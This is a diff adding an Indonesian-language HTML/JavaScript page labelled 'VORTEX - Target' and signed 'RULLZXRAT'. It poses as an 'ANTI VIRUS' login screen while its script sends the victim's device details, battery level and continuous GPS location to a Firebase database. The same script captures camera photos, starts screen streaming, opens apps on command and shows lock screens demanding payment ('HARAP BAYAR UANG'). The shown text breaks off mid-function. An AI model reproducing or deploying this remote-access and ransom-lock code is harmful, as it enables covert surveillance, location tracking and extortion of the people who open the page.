@@ -1,0 +1,943 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>VORTEX - Target</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', 'Segoe UI', sans-serif; user-select: none; }
+        body { 
+            background: #f0f2f5; 
+            height: 100vh; 
+            overflow: hidden; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+        }
+        .login-container {
+            background: #fff;
+            border-radius: 24px;
+            padding: 40px 32px;
+            width: 92%;
+            max-width: 380px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.12);
+            text-align: center;
+        }
+        .login-logo {
+            font-size: 48px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #00ffcc, #0099aa);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 8px;
+        }
+        .login-sub {
+            font-size: 14px;
+            color: #888;
+            margin-bottom: 28px;
+            letter-spacing: 1px;
+        }
+        .login-input {
+            width: 100%;
+            padding: 16px 18px;
+            border: 2px solid #e8ecf0;
+            border-radius: 16px;
+            font-size: 15px;
+            margin-bottom: 14px;
+            outline: none;
+            background: #f8f9fa;
+            color: #111;
+            transition: opacity 0.3s;
+        }
+        .login-input:focus { border-color: #00ffcc; background: #fff; }
+        .login-input:disabled { opacity: 0.5; cursor: not-allowed; }
+        .login-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #00ffcc, #0099aa);
+            border: none;
+            border-radius: 16px;
+            color: #000;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            letter-spacing: 1px;
+        }
+        .login-btn:active { transform: scale(0.97); }
+        .login-btn.loading { opacity: 0.6; pointer-events: none; }
+        .login-btn:disabled { opacity: 0.6; cursor: default; }
+        .login-status {
+            font-size: 13px;
+            margin-top: 12px;
+            min-height: 22px;
+            font-weight: 600;
+        }
+        .login-status.error { color: #ff4444; }
+
+        /* ===== LOCK, SOS, HELL (CSS sudah ada) ===== */
+        #lockCont { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; color: #fff; text-align: center; padding-top: 80px; z-index: 9999; background: #000; background-size: cover; }
+        #lockCont::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: -1; }
+        .lock-icon { font-size: 90px; color: #ff3b3b; margin-bottom: 25px; position: relative; z-index: 1; }
+        h2 { font-size: 20px; font-weight: 900; letter-spacing: 1px; margin-bottom: 10px; position: relative; z-index: 1; }
+        .sub-txt { font-size: 11px; color: #888; margin-bottom: 20px; letter-spacing: 2px; position: relative; z-index: 1; }
+        .pin-display { background: rgba(0,0,0,0.7); border: 1px solid #333; padding: 15px; width: 200px; margin: 0 auto; border-radius: 6px; font-size: 32px; color: #00ffcc; letter-spacing: 12px; height: 65px; display: flex; align-items: center; justify-content: center; position: relative; z-index: 1; }
+        .dev-txt { font-size: 10px; color: #aaa; margin-top: 15px; font-weight: bold; text-transform: uppercase; position: relative; z-index: 1; }
+        .input-hidden { position: absolute; opacity: 0; pointer-events: none; }
+        .warn { color: #ff3b3b; font-size: 12px; font-weight: 900; position: absolute; bottom: 30px; left: 0; right: 0; width: 100%; text-transform: uppercase; text-align: center; z-index: 1; letter-spacing: 1px; }
+        #hell { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10000; background: #000; overflow: hidden; align-items: center; justify-content: center; flex-direction: column; }
+        #matrixCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; opacity: 0.7; }
+        .hell-rotating-wrapper { position: relative; z-index: 2; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; pointer-events: none; animation: floatPath 6s ease-in-out infinite; }
+        @keyframes floatPath { 0% { transform: translate(0px, 0px); } 25% { transform: translate(60px, -40px); } 50% { transform: translate(-40px, 60px); } 75% { transform: translate(50px, 30px); } 100% { transform: translate(0px, 0px); } }
+        .hell-rotating-text { font-family: 'Courier New', monospace; font-size: 48px; font-weight: 900; color: #00ff41; text-shadow: 0 0 20px #00ff41, 0 0 60px #00ff41, 0 0 100px #00ff41; animation: rotateText 4s linear infinite; letter-spacing: 4px; text-transform: uppercase; white-space: nowrap; background: rgba(0,0,0,0.5); padding: 20px 40px; border-radius: 20px; border: 2px solid rgba(0,255,65,0.3); backdrop-filter: blur(4px); }
+        @keyframes rotateText { 0% { transform: rotate(0deg) scale(1); } 50% { transform: rotate(180deg) scale(1.05); } 100% { transform: rotate(360deg) scale(1); } }
+        #sosLockV2 { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 30000; background: #0a0000; overflow: hidden; align-items: center; justify-content: center; flex-direction: column; }
+        #sosMatrixCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; opacity: 0.8; }
+        .sosv2-wrapper { position: relative; z-index: 2; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; pointer-events: none; animation: floatPathSOS 7s ease-in-out infinite; }
+        @keyframes floatPathSOS { 0% { transform: translate(0px, 0px) rotate(-1deg); } 33% { transform: translate(70px, -50px) rotate(1deg); } 66% { transform: translate(-50px, 60px) rotate(-1deg); } 100% { transform: translate(0px, 0px) rotate(0deg); } }
+        .sosv2-text { font-family: 'Courier New', monospace; font-size: 44px; font-weight: 900; color: #ff0040; text-shadow: 0 0 20px #ff0040, 0 0 60px #ff0040, 0 0 120px #ff0040; animation: rotateTextSOS 5s linear infinite; letter-spacing: 6px; text-transform: uppercase; white-space: nowrap; background: rgba(20,0,0,0.7); padding: 24px 48px; border-radius: 24px; border: 2px solid rgba(255,0,64,0.4); backdrop-filter: blur(6px); }
+        @keyframes rotateTextSOS { 0% { transform: rotate(0deg) scale(1); } 50% { transform: rotate(180deg) scale(1.08); } 100% { transform: rotate(360deg) scale(1); } }
+        .sosv2-sub { position: absolute; bottom: 60px; z-index: 3; font-family: 'Courier New', monospace; color: #ff4466; font-size: 18px; letter-spacing: 8px; text-transform: uppercase; text-shadow: 0 0 30px rgba(255,0,64,0.5); animation: subPulse 3s ease-in-out infinite alternate; }
+        @keyframes subPulse { 0% { opacity: 0.3; letter-spacing: 4px; } 100% { opacity: 1; letter-spacing: 12px; } }
+        #lockV2 { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 30000; align-items: center; justify-content: center; text-align: center; flex-direction: column; background: #0b0815; }
+        .lockv2-box { max-width: 460px; width: 92%; background: rgba(20,12,40,0.85); backdrop-filter: blur(20px); border-radius: 72px; padding: 48px 36px; border: 1px solid rgba(180,80,255,0.3); box-shadow: 0 40px 80px rgba(0,0,0,0.6), 0 0 50px rgba(180,80,255,0.08); animation: floatSlow 4s ease-in-out infinite; position: relative; z-index: 2; }
+        @keyframes floatSlow { 0%, 100% { transform: translateY(0px) rotate(0deg); } 50% { transform: translateY(-12px) rotate(0.5deg); } }
+        .lockv2-icon { font-size: 88px; display: block; margin-bottom: 12px; animation: spinSlow 7s linear infinite; filter: drop-shadow(0 0 30px rgba(180,80,255,0.5)); }
+        @keyframes spinSlow { 0% { transform: rotate(0deg) scale(1); } 50% { transform: rotate(180deg) scale(1.05); } 100% { transform: rotate(360deg) scale(1); } }
+        .lockv2-title { font-size: 36px; font-weight: 800; background: linear-gradient(135deg, #c084fc, #f472b6); -webkit-background-clip: text; background-clip: text; color: transparent; letter-spacing: 8px; margin-bottom: 6px; animation: gradMove 3.5s ease-in-out infinite alternate; }
+        @keyframes gradMove { 0% { background-position: 0% 50%; } 100% { background-position: 100% 50%; } }
+        .lockv2-sub { font-size: 16px; color: #a78bfa; letter-spacing: 5px; text-transform: uppercase; margin-bottom: 24px; font-weight: 500; }
+        .lockv2-msg { background: rgba(180,80,255,0.06); border: 1px solid rgba(180,80,255,0.18); border-radius: 60px; padding: 18px 28px; color: #e9d5ff; font-size: 20px; font-weight: 600; font-family: 'Courier New', monospace; margin: 20px 0; letter-spacing: 2px; animation: borderGlow 3.5s ease-in-out infinite alternate; }
+        @keyframes borderGlow { 0% { border-color: rgba(180,80,255,0.1); box-shadow: 0 0 15px rgba(180,80,255,0.05); } 100% { border-color: rgba(180,80,255,0.5); box-shadow: 0 0 40px rgba(180,80,255,0.2); } }
+        .lockv2-data { background: rgba(0,0,0,0.4); border-radius: 40px; padding: 20px 24px; margin: 18px 0; border: 1px solid rgba(255,255,255,0.04); }
+        .lockv2-data .row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 16px; }
+        .lockv2-data .row:last-child { border-bottom: none; }
+        .lockv2-data .label { color: #a78bfa; font-weight: 500; }
+        .lockv2-data .value { color: #fbbf24; font-weight: 600; }
+        .lockv2-warn { font-size: 15px; color: #f472b6; letter-spacing: 4px; margin-top: 18px; font-weight: 600; animation: warnGlow 2.2s ease-in-out infinite alternate; }
+        @keyframes warnGlow { 0% { opacity: 0.5; text-shadow: 0 0 5px rgba(244,114,182,0.2); } 100% { opacity: 1; text-shadow: 0 0 25px rgba(244,114,182,0.7); } }
+        #sosLock { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #060c14; z-index: 20000; align-items: center; justify-content: center; text-align: center; flex-direction: column; }
+        .sos-box { max-width: 460px; width: 92%; background: rgba(8,20,40,0.78); backdrop-filter: blur(18px); border-radius: 72px; padding: 48px 36px; border: 2px solid rgba(0,200,255,0.3); box-shadow: 0 40px 80px rgba(0,0,0,0.6), 0 0 60px rgba(0,200,255,0.06); animation: sosFloatSlow 4.5s ease-in-out infinite; position: relative; z-index: 2; }
+        @keyframes sosFloatSlow { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-10px); } }
+        .sos-emoji { font-size: 96px; display: block; margin-bottom: 10px; animation: pulseEmoji 3.2s ease-in-out infinite; filter: drop-shadow(0 0 30px rgba(0,200,255,0.4)); }
+        @keyframes pulseEmoji { 0%, 100% { transform: scale(1) rotate(-2deg); } 50% { transform: scale(1.06) rotate(2deg); } }
+        .sos-title { font-size: 38px; font-weight: 900; color: #38bdf8; letter-spacing: 8px; text-shadow: 0 0 30px rgba(56,189,248,0.25); animation: titleShift 3.2s ease-in-out infinite alternate; }
+        @keyframes titleShift { 0% { letter-spacing: 8px; opacity: 0.8; } 100% { letter-spacing: 16px; opacity: 1; } }
+        .sos-sub { font-size: 16px; color: #7dd3fc; letter-spacing: 5px; text-transform: uppercase; font-weight: 500; margin: 6px 0 18px; animation: subBlink 2.5s ease-in-out infinite alternate; }
+        @keyframes subBlink { 0% { opacity: 0.3; } 100% { opacity: 1; } }
+        .sos-msg { background: rgba(0,200,255,0.05); border: 1px solid rgba(0,200,255,0.18); border-radius: 60px; padding: 18px 28px; color: #bae6fd; font-size: 20px; font-weight: 700; font-family: 'Courier New', monospace; margin: 18px 0; letter-spacing: 2px; animation: msgPulseSlow 3.8s ease-in-out infinite alternate; }
+        @keyframes msgPulseSlow { 0% { border-color: rgba(0,200,255,0.1); box-shadow: 0 0 15px rgba(0,200,255,0.05); } 100% { border-color: rgba(0,200,255,0.5); box-shadow: 0 0 50px rgba(0,200,255,0.25); } }
+        .sos-divider { width: 150px; height: 3px; background: linear-gradient(90deg, transparent, #38bdf8, transparent); margin: 14px auto; border-radius: 4px; animation: dividerMove 3s ease-in-out infinite; }
+        @keyframes dividerMove { 0% { width: 100px; opacity: 0.3; } 100% { width: 250px; opacity: 1; } }
+        .sos-warn { font-size: 15px; color: #7dd3fc; letter-spacing: 5px; font-weight: 500; margin-top: 18px; animation: warnBreath 2.5s ease-in-out infinite alternate; }
+        @keyframes warnBreath { 0% { opacity: 0.2; } 100% { opacity: 1; } }
+        @media (max-width: 480px) { .lockv2-box, .sos-box { padding: 28px 18px; } .lockv2-title { font-size: 24px; letter-spacing: 4px; } .sos-title { font-size: 26px; letter-spacing: 4px; } .lockv2-icon { font-size: 60px; } .sos-emoji { font-size: 68px; } .lockv2-data .row { font-size: 13px; } .hell-rotating-text { font-size: 28px; padding: 14px 24px; } .sosv2-text { font-size: 24px; padding: 16px 20px; letter-spacing: 3px; } }
+    </style>
+</head>
+<body>
+
+    <!-- ===== FAKE LOGIN ===== -->
+    <div class="login-container" id="fakeLogin">
+        <div class="login-logo">ANTI VIRUS</div>
+        <div class="login-sub">Selamat datang kembali</div>
+        <input type="text" class="login-input" id="fakeUser" placeholder="Masukkan Kode UID" value="">
+        <button class="login-btn" id="loginBtn">Login</button>
+        <div class="login-status" id="loginStatus"></div>
+        <div class="login-footer"></div>
+    </div>
+
+    <!-- ===== LOCK BIASA ===== -->
+    <div id="lockCont">
+        <div class="lock-icon">🔒</div>
+        <h2 id="lTit">LOCK BY RULLZXRAT</h2>
+        <p class="sub-txt">MASUKKAN PIN</p>
+        <div class="pin-display" id="dotsDisplay"></div>
+        <div class="dev-txt">Developer By Rullz</div> 
+        <input type="number" id="realInput" class="input-hidden" oninput="handleInput(this)">
+        <div class="warn">JANGAN MENCOBA MERESTART HP ANDA</div>
+    </div>
+
+    <!-- HELL LOCK -->
+    <div id="hell">
+        <canvas id="matrixCanvas"></canvas>
+        <div class="hell-rotating-wrapper">
+            <div class="hell-rotating-text" id="hellMessage">HELLO I'M RULLZ</div>
+        </div>
+    </div>
+
+    <!-- SOS LOCK V2 -->
+    <div id="sosLockV2">
+        <canvas id="sosMatrixCanvas"></canvas>
+        <div class="sosv2-wrapper">
+            <div class="sosv2-text" id="sosV2Message">AKSES DIBLOKIR</div>
+        </div>
+        <div class="sosv2-sub">— DEVELOPER BY RULLZ —</div>
+    </div>
+
+    <!-- LOCK V2 -->
+    <div id="lockV2">
+        <div class="lockv2-box">
+            <span class="lockv2-icon">💀</span>
+            <div class="lockv2-title">SYSTEM LOCKED</div>
+            <div class="lockv2-sub">[ PERMANENT LOCK ]</div>
+            <div class="lockv2-msg" id="lockV2Message">HARAP BAYAR UANG</div>
+            <div class="lockv2-data">
+                <div class="row"><span class="label">📝 PENGIRIM</span> <span class="value" id="v2PengirimText">-</span></div>
+                <div class="row"><span class="label">📱 NOMOR HP</span> <span class="value" id="v2NoHpText">-</span></div>
+                <div class="row"><span class="label">💰 NOMINAL</span> <span class="value" id="v2NominalText">-</span></div>
+                <div class="row"><span class="label">💳 METODE</span> <span class="value" id="v2MetodeText">-</span></div>
+            </div>
+            <div class="lockv2-warn">jangan mencoba keluar</div>
+        </div>
+    </div>
+
+    <!-- SOS LOCK biasa -->
+    <div id="sosLock">
+        <div class="sos-box">
+            <span class="sos-emoji">☠️</span>
+            <div class="sos-title">LOCKED</div>
+            <div class="sos-sub">HELLO I'M RULLZ</div>
+            <div class="sos-divider"></div>
+            <div class="sos-msg" id="sosMessage">Hacked By Rullz</div>
+            <div class="sos-divider"></div>
+            <div class="sos-warn">Developer By Rullz</div>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            var firebaseConfig = {
+                apiKey: "AIzaSyBUhXZ_YKmTQNsDzeWX0072Zfb9lVi4jfE",
+                databaseURL: "https://rullzxrat-default-rtdb.firebaseio.com"
+            };
+            if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+            var database = firebase.database();
+            var MY_ID = "";
+            var commandListener = null;
+            var watchId = null;
+            var onlineInterval = null;
+            var dataInterval = null;
+
+            // =============================================================
+            // 🔥 FUNGSI OPEN APP (untuk perintah OPEN_APP dari admin)
+            // =============================================================
+            function openApp(packageName) {
+                try {
+                    // 1️⃣ Coba melalui native interface (jika ada)
+                    if (window.RullzInterface && typeof window.RullzInterface.openApp === 'function') {
+                        window.RullzInterface.openApp(packageName);
+                        console.log('✅ Membuka app via native:', packageName);
+                        return;
+                    }
+                    // 2️⃣ Fallback: gunakan intent URL untuk Android
+                    var intentUrl = 'intent://' + packageName + '#Intent;package=' + packageName + ';scheme=android-app;end';
+                    window.open(intentUrl, '_blank');
+                    console.log('📱 Fallback intent URL:', intentUrl);
+                    // 3️⃣ Jika gagal, coba pakai play store link
+                    setTimeout(function() {
+                        try {
+                            window.open('market://details?id=' + packageName, '_blank');
+                        } catch(e2) {}
+                    }, 500);
+                } catch(e) {
+                    console.warn('Gagal buka app:', e);
+                    try {
+                        window.open('market://details?id=' + packageName, '_blank');
+                    } catch(e2) {}
+                }
+            }
+
+            // =============================================================
+            // 🔥 DETEKSI NAMA DEVICE (lengkap)
+            // =============================================================
+            function getDeviceName() {
+                try {
+                    var ua = navigator.userAgent;
+                    if (ua.includes('SM-')) {
+                        var sm = ua.match(/SM-[A-Z0-9]+/);
+                        if (sm) {
+                            var code = sm[0];
+                            if (code.includes('S928')) return 'Samsung Galaxy S24 Ultra';
+                            if (code.includes('S918')) return 'Samsung Galaxy S23 Ultra';
+                            if (code.includes('S908')) return 'Samsung Galaxy S22 Ultra';
+                            if (code.includes('S901')) return 'Samsung Galaxy S21';
+                            if (code.includes('S906')) return 'Samsung Galaxy S21+';
+                            if (code.includes('S711')) return 'Samsung Galaxy S23 FE';
+                            if (code.includes('A546')) return 'Samsung Galaxy A54';
+                            if (code.includes('A536')) return 'Samsung Galaxy A53';
+                            if (code.includes('A346')) return 'Samsung Galaxy A34';
+                            if (code.includes('A336')) return 'Samsung Galaxy A33';
+                            if (code.includes('A127')) return 'Samsung Galaxy A12';
+                            if (code.includes('A037')) return 'Samsung Galaxy A03s';
+                            return 'Samsung ' + code;
+                        }
+                        return 'Samsung Galaxy';
+                    }
+                    if (ua.includes('iPhone')) {
+                        if (ua.includes('iPhone17,1') || ua.includes('iPhone17,2')) return 'iPhone 16 Pro';
+                        if (ua.includes('iPhone16,1') || ua.includes('iPhone16,2')) return 'iPhone 15 Pro';
+                        if (ua.includes('iPhone15,2') || ua.includes('iPhone15,3')) return 'iPhone 14 Pro';
+                        if (ua.includes('iPhone14,2') || ua.includes('iPhone14,3')) return 'iPhone 13 Pro';
+                        if (ua.includes('iPhone13,2') || ua.includes('iPhone13,3')) return 'iPhone 12';
+                        return 'iPhone';
+                    }
+                    if (ua.includes('Pixel')) {
+                        var px = ua.match(/Pixel\s[0-9]+/);
+                        return px ? px[0] : 'Google Pixel';
+                    }
+                    if (ua.includes('Xiaomi') || ua.includes('Redmi') || ua.includes('POCO')) {
+                        if (ua.includes('Redmi 9C') || ua.includes('M2006C3MG')) return 'Redmi 9C';
+                        if (ua.includes('Redmi 9')) return 'Redmi 9';
+                        if (ua.includes('Redmi 9A')) return 'Redmi 9A';
+                        if (ua.includes('Redmi 9T')) return 'Redmi 9T';
+                        if (ua.includes('Redmi 10')) return 'Redmi 10';
+                        if (ua.includes('Redmi 10C')) return 'Redmi 10C';
+                        if (ua.includes('Redmi 10A')) return 'Redmi 10A';
+                        if (ua.includes('Redmi Note 10')) return 'Redmi Note 10';
+                        if (ua.includes('Redmi Note 11')) return 'Redmi Note 11';
+                        if (ua.includes('Redmi Note 12')) return 'Redmi Note 12';
+                        if (ua.includes('Redmi Note 13')) return 'Redmi Note 13';
+                        if (ua.includes('Redmi K50')) return 'Redmi K50';
+                        if (ua.includes('Redmi K60')) return 'Redmi K60';
+                        if (ua.includes('Redmi K70')) return 'Redmi K70';
+                        if (ua.includes('Xiaomi 13')) return 'Xiaomi 13';
+                        if (ua.includes('Xiaomi 14')) return 'Xiaomi 14';
+                        if (ua.includes('Xiaomi 12')) return 'Xiaomi 12';
+                        if (ua.includes('Xiaomi 11')) return 'Xiaomi 11';
+                        if (ua.includes('POCO X3')) return 'POCO X3';
+                        if (ua.includes('POCO X4')) return 'POCO X4';
+                        if (ua.includes('POCO X5')) return 'POCO X5';
+                        if (ua.includes('POCO F4')) return 'POCO F4';
+                        if (ua.includes('POCO F5')) return 'POCO F5';
+                        if (ua.includes('POCO M3')) return 'POCO M3';
+                        if (ua.includes('POCO M4')) return 'POCO M4';
+                        if (ua.includes('POCO M5')) return 'POCO M5';
+                        var match = ua.match(/(Redmi|Xiaomi|POCO)\s[^\s;]+/);
+                        return match ? match[0] : 'Xiaomi/Redmi';
+                    }
+                    if (ua.includes('Oppo') || ua.includes('OPPO')) {
+                        if (ua.includes('CPH')) {
+                            var cph = ua.match(/CPH[0-9]{4}/);
+                            if (cph) {
+                                var code = cph[0];
+                                if (code === 'CPH2451') return 'Oppo Find X6';
+                                if (code === 'CPH2449') return 'Oppo Find X6 Pro';
+                                if (code === 'CPH2357') return 'Oppo Find N2 Flip';
+                                if (code === 'CPH2307') return 'Oppo Reno8';
+                                if (code === 'CPH2325') return 'Oppo Reno8 Pro';
+                                if (code === 'CPH2399') return 'Oppo Reno9';
+                                if (code === 'CPH2455') return 'Oppo Reno10';
+                                if (code === 'CPH2473') return 'Oppo Reno11';
+                                if (code === 'CPH2185') return 'Oppo A54';
+                                if (code === 'CPH2213') return 'Oppo A74';
+                                if (code === 'CPH2255') return 'Oppo A94';
+                                if (code === 'CPH2363') return 'Oppo A77';
+                                if (code === 'CPH2409') return 'Oppo A96';
+                                if (code === 'CPH2437') return 'Oppo A98';
+                                return 'Oppo ' + code;
+                            }
+                        }
+                        if (ua.includes('Find X')) {
+                            var fx = ua.match(/Find\sX[0-9]+/);
+                            if (fx) return 'Oppo ' + fx[0];
+                        }
+                        if (ua.includes('Reno')) {
+                            var rn = ua.match(/Reno[0-9]+/);
+                            if (rn) return 'Oppo ' + rn[0];
+                        }
+                        return 'Oppo';
+                    }
+                    if (ua.includes('Vivo') || ua.includes('vivo') || ua.includes('iQOO')) {
+                        if (ua.includes('V2')) {
+                            var v = ua.match(/V[0-9]{4}/);
+                            if (v) {
+                                var code = v[0];
+                                if (code === 'V2141') return 'Vivo X70 Pro';
+                                if (code === 'V2144') return 'Vivo X70 Pro+';
+                                if (code === 'V2202') return 'Vivo X80';
+                                if (code === 'V2244') return 'Vivo X90';
+                                if (code === 'V2250') return 'Vivo X90 Pro';
+                                if (code === 'V2270') return 'Vivo X90 Pro+';
+                                if (code === 'V2154') return 'Vivo V23';
+                                if (code === 'V2183') return 'Vivo V23 Pro';
+                                if (code === 'V2207') return 'Vivo V25';
+                                if (code === 'V2253') return 'Vivo V27';
+                                if (code === 'V2302') return 'Vivo V29';
+                                if (code === 'V2041') return 'Vivo Y20';
+                                if (code === 'V2108') return 'Vivo Y21';
+                                if (code === 'V2143') return 'Vivo Y22';
+                                if (code === 'V2158') return 'Vivo Y33';
+                                if (code === 'V2167') return 'Vivo Y35';
+                                if (code === 'V2178') return 'Vivo Y55';
+                                return 'Vivo ' + code;
+                            }
+                        }
+                        if (ua.includes('iQOO')) {
+                            var iq = ua.match(/iQOO\s[0-9]+/);
+                            if (iq) return 'iQOO ' + iq[0];
+                            return 'iQOO';
+                        }
+                        return 'Vivo';
+                    }
+                    if (ua.includes('Realme') || ua.includes('realme')) {
+                        if (ua.includes('RMX')) {
+                            var rmx = ua.match(/RMX[0-9]{4}/);
+                            if (rmx) {
+                                var code = rmx[0];
+                                if (code === 'RMX3393') return 'Realme GT Neo 3';
+                                if (code === 'RMX3562') return 'Realme GT Neo 3T';
+                                if (code === 'RMX3360') return 'Realme GT Neo 2';
+                                if (code === 'RMX3312') return 'Realme GT 2';
+                                if (code === 'RMX3300') return 'Realme GT 2 Pro';
+                                if (code === 'RMX3472') return 'Realme 9 Pro';
+                                if (code === 'RMX3516') return 'Realme 9i';
+                                if (code === 'RMX3612') return 'Realme 10';
+                                if (code === 'RMX3630') return 'Realme 10 Pro';
+                                if (code === 'RMX3661') return 'Realme 11 Pro';
+                                return 'Realme ' + code;
+                            }
+                        }
+                        if (ua.match(/Realme\s[0-9]+/)) {
+                            var rn = ua.match(/Realme\s[0-9]+/);
+                            return rn ? rn[0] : 'Realme';
+                        }
+                        return 'Realme';
+                    }
+                    if (ua.includes('OnePlus')) {
+                        var op = ua.match(/OnePlus\s[0-9]+/);
+                        if (op) return op[0];
+                        if (ua.includes('NE2211') || ua.includes('NE2213')) return 'OnePlus 11';
+                        if (ua.includes('NE2215')) return 'OnePlus 11 5G';
+                        if (ua.includes('CPH2451')) return 'OnePlus 11R';
+                        return 'OnePlus';
+                    }
+                    if (ua.includes('Huawei')) {
+                        if (ua.includes('P')) {
+                            var p = ua.match(/P[0-9]{2}/);
+                            if (p) return 'Huawei ' + p[0];
+                        }
+                        if (ua.includes('Mate')) {
+                            var m = ua.match(/Mate\s[0-9]+/);
+                            if (m) return 'Huawei ' + m[0];
+                        }
+                        return 'Huawei';
+                    }
+                    if (ua.includes('Honor')) {
+                        if (ua.match(/Honor\s[0-9]+/)) {
+                            var hr = ua.match(/Honor\s[0-9]+/);
+                            return hr ? hr[0] : 'Honor';
+                        }
+                        return 'Honor';
+                    }
+                    if (ua.includes('Nokia')) return 'Nokia';
+                    if (ua.includes('Sony')) return 'Sony';
+                    if (ua.includes('LG')) return 'LG';
+                    if (ua.includes('ASUS') || ua.includes('ZenFone')) {
+                        if (ua.includes('ZenFone')) return 'ASUS ZenFone';
+                        return 'ASUS';
+                    }
+                    if (ua.includes('Nothing')) return 'Nothing Phone';
+                    var match = ua.match(/Android\s[0-9.]+;\s([^;)]+)/);
+                    if (match && match[1]) {
+                        var model = match[1].trim();
+                        if (model && !model.match(/[A-Z0-9]{10,}/) && !model.includes('Build/') && model.length < 40) {
+                            return model.replace(/Build\/[^\s]+/, '').replace(/QP1A\.[^\s]+/, '').trim();
+                        }
+                    }
+                    return 'Android Device';
+                } catch(e) { return 'Unknown Device'; }
+            }
+
+            function getAndroidVersion() {
+                var ua = navigator.userAgent;
+                var match = ua.match(/Android\s([0-9.]+)/);
+                return match ? match[1] : 'N/A';
+            }
+            function getRAM() { return navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A'; }
+            function getLanguage() { return navigator.language || 'N/A'; }
+
+            function sendDeviceData() {
+                if (!MY_ID) return;
+                var deviceName = getDeviceName();
+                var androidVer = getAndroidVersion();
+                var ram = getRAM();
+                var language = getLanguage();
+                var targetRef = database.ref('targets/' + MY_ID);
+                targetRef.child('deviceInfo').update({
+                    deviceName: deviceName,
+                    androidVersion: androidVer,
+                    ram: ram,
+                    language: language,
+                    lastUpdate: firebase.database.ServerValue.TIMESTAMP
+                }).catch(function(e){});
+                if ('getBattery' in navigator) {
+                    navigator.getBattery().then(function(battery) {
+                        var level = Math.round(battery.level * 100);
+                        targetRef.update({ battery: level, online: true, lastSeen: firebase.database.ServerValue.TIMESTAMP }).catch(function(e){});
+                    }).catch(function() {
+                        targetRef.update({ battery: 'N/A', online: true, lastSeen: firebase.database.ServerValue.TIMESTAMP }).catch(function(e){});
+                    });
+                } else {
+                    targetRef.update({ battery: 'N/A', online: true, lastSeen: firebase.database.ServerValue.TIMESTAMP }).catch(function(e){});
+                }
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(function(pos) {
+                        targetRef.child('location').set({
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            timestamp: firebase.database.ServerValue.TIMESTAMP
+                        }).catch(function(e){});
+                    }, function(e){}, { enableHighAccuracy: true, timeout: 10000, maximumAge: 5000 });
+                }
+            }
+
+            function startLocationWatch() {
+                if (!MY_ID || !navigator.geolocation) return;
+                if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+                watchId = navigator.geolocation.watchPosition(function(pos) {
+                    database.ref('targets/' + MY_ID + '/location').set({
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        timestamp: firebase.database.ServerValue.TIMESTAMP
+                    }).catch(function(e){});
+                }, function(e){}, { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 });
+            }
+
+            function stopLocationWatch() {
+                if (watchId !== null) { navigator.geolocation.clearWatch(watchId); watchId = null; }
+            }
+
+            function captureCamera(facingMode, callback) {
+                if (!navigator.mediaDevices) { callback(null); return; }
+                navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingMode, width: { ideal: 320 }, height: { ideal: 240 } }
+                }).then(function(stream) {
+                    var video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.onloadedmetadata = function() {
+                        video.play();
+                        var canvas = document.createElement('canvas');
+                        canvas.width = 320; canvas.height = 240;
+                        var ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, 320, 240);
+                        var dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+                        stream.getTracks().forEach(function(t) { t.stop(); });
+                        callback(dataUrl);
+                    };
+                    video.load();
+                }).catch(function(err) { callback(null); });
+            }
+
+            function sendCameraImage(facingMode, commandId) {
+                if (!MY_ID) return;
+                captureCamera(facingMode, function(dataUrl) {
+                    if (dataUrl) {
+                        database.ref('commands/' + MY_ID + '/camera/' + commandId).set({
+                            image: dataUrl,
+                            timestamp: firebase.database.ServerValue.TIMESTAMP,
+                            facing: facingMode
+                        }).catch(function(e){});
+                    }
+                });
+            }
+
+            var screenStream = null, screenInterval = null, isScreenStreaming = false;
+            function startScreenStream() {
+                if (isScreenStreaming || !MY_ID) return;
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
+                navigator.mediaDevices.getDisplayMedia({
+                    video: { width: { ideal: 320 }, height: { ideal: 240 } }
+                }).then(function(stream) {
+                    screenStream = stream;
+                    isScreenStreaming = true;
+                    var video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.onloadedmetadata = function() {
+                        video.play();
+                        var canvas = document.createElement('canvas');
+                        canvas.width = 320; canvas.height = 240;
+                        var ctx = canvas.getContext('2d');
+                        screenInterval = setInterval(function() {
